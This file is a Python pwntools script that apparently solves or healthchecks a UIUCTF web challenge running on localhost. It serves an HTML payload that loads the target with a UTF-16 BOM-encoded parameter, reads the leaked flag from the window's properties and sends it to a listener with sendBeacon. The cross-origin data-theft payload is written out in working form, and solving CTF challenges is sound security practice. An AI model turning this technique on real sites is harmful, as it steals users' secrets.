#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.util.web
from pwnlib.tubes import remote
from pwnlib.tubes.server import server
from pwnlib.tubes.listen import listen



if b"uiuctf{FAKEFLAG}" not in pwnlib.util.web.wget("http://localhost:1337/"):
      exit(1)

l = listen()

payload = f'''
<!DOCTYPE html>
<html lang="en">
  <body>
    <script src="http://localhost:1337/?p=FEFF002B002B00770069006E0064006F0077002E"></script>
    <script>
      const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&0xff)]).join('');
      const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf{{'));
      navigator.sendBeacon("http://localhost:{l.lport}/",flag);
      console.log(flag);
    </script>
  </body>
</html>
'''

def cb(r):
    print("cb")
    r.send("HTTP/1.1 200 OK\r\n"+payload)
s = server(callback=cb)

print(s.lport)

r = remote('127.0.0.1', 1337)

l.wait_for_connection()

print(l.recvline())

exit(0)
